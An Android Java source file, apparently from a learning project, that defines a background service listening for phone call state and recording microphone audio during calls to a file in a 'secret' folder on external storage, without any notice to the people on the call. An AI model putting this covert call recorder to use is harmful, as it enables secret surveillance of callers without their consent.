package com.sty.phone.moniter.service;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;

/**
 * Created by Steven.T on 2017/12/13/0013.
 */

public class PhoneService extends Service {

    private MediaRecorder recorder;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {

        return null;
    }

    //服务第一次被开启的时候调用
    @Override
    public void onCreate() {
        //1.获取电话管理者的实例
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        //2.注册一个电话状态的监听
        telephonyManager.listen(new MyPhoneStateListener(), PhoneStateListener.LISTEN_CALL_STATE);

        super.onCreate();
    }


    //监听电话状态的类
    private class MyPhoneStateListener extends PhoneStateListener{
        //当设备的状态发生改变的时候调用
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            //具体判断一下电话处于什么状态
            switch (state){
                case TelephonyManager.CALL_STATE_IDLE: //空闲状态
                    stopMediaRecorder();
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK: //接听状态
                    Log.i("Tag", "开始录音");
                    recorder.start(); //Recording is now started
                    break;
                case TelephonyManager.CALL_STATE_RINGING: //响铃状态
                    Log.i("Tag", "准备一个录音机准备录音");
                    prepareMediaRecorder();
                    break;
                default:
                    break;
            }
            super.onCallStateChanged(state, incomingNumber);
        }
    }


    private void prepareMediaRecorder(){
        //1.获取MediaRecorder类的实例
        recorder = new MediaRecorder();
        //2.设置音频的来源
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC); //zet
        //3.设置音频的输出格式
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        //4.设置音频的编码方式
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        //5.保存的文件路径
        recorder.setOutputFile(Environment.getExternalStorageDirectory() + "/secret/luyin.3gp");
        //6.准备录音
        try {
            recorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopMediaRecorder(){
        if(recorder != null){
            recorder.stop(); //停止录制
            recorder.reset(); //you can reuse the object by going back to setAudioSource() step
            recorder.release(); //now the object cannot be reused
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
